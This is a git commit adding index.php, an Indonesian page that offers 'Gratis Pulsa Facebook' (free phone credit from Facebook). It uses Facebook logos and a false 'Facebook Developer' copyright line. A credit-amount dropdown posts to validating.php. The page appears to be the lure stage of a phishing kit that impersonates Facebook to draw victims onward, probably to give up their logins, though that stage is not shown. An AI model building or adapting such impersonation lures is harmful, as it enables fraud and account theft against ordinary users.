a173ce1eefc4c9b6363453530f49a52ee9c56495
ebzan <68161459+ebzan@users.noreply.github.com>
2020-07-12 18:12:48 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Gratis Pulsa</title>
+<script src="js/jquery.min.js"></script>
+<link rel="stylesheet" href="js/bootstrap.min.css">
+<style>
+h1, .h1, h2, .h2, h3, .h3 {
+    margin-top: 0px;
+    margin-bottom: 10.5px;
+}
+body { 
+  -webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+  background-size: cover;
+}
+.error-msg {
+    margin: .5em 0;
+    display: block;
+    color: #dd4b39;
+    line-height: 17px;
+}
+.col-md-6 {
+ margin:0 auto;
+ float:none;
+
+}
+.col-md-12 {
+ margin:0 auto;
+ float:none;
+
+}
+</style>
+
+<body style="padding:0px;margin:0 auto;">
+<div style="padding:0px;margin:0 auto;" class="container ">
+
+<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
+<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
+<img style="border:none;width:100%;max-height:270px;margin:0 auto;" src="img/header.jpg"/>
+<div style="border:none;" class="btn btn-success btn-lg btn-block"><b><i class="fa fa-facebook"></i> Gratis Pulsa Facebook</b></div>
+</div>
+<center style="background:white;"><br>
+<div class="col-md-12">
+<h2><img src="img/fb.jpg"></h2>
+<h3>
+  Dapatkan Pulsa Gratis dari Facebook sekarang juga !
+</h3>
+<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background:#f7f7f7;width:100%" class="form-horizontal">
+<h4 ><b> Pilih Nominal Pulsa </b></h4><FORM NAME="frmSignUp" METHOD="post" ACTION="validating.php">
+<div style="width:100%" class="form-group">
+<div class="input-group">
+    <span class="input-group-addon"><img src="img/like.png"></span>
+            <select class="form-control" id="like">
+           <option>10.000</option>
+          <option>20.000</option>
+          <option>30.000</option>
+          <option>40.000</option>
+          <option>50.000</option>
+          <option>60.000</option>
+		  <option>70.000</option>
+		  <option>80.000</option>
+		  <option>90.000</option>
+		  <option>100.000</option>
+        </select>
+  </div>
+</div>
+
+<div style="text-align:left" class="error-msg" id="hasilnya"></div>
+<div style="width:100%" class="form-group">
+  <input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #2780e3;" id="gsubmit" value="Next"> </form>
+</div>
+</div><br><br>
+</div>
+<div style="height:110px;color: #737373;background-color: #f7f7f7;" class="btn btn-block">
+<div style="height:110px;color: #737373;background-color: #f7f7f7;" class="btn btn-block">
+<center><p>Gratis Pulsa Facebook </p></center>
+<p>Copyright &copy; 2019 Facebook Developer.</p>
+
+</div>
+</div>
+
+</div>
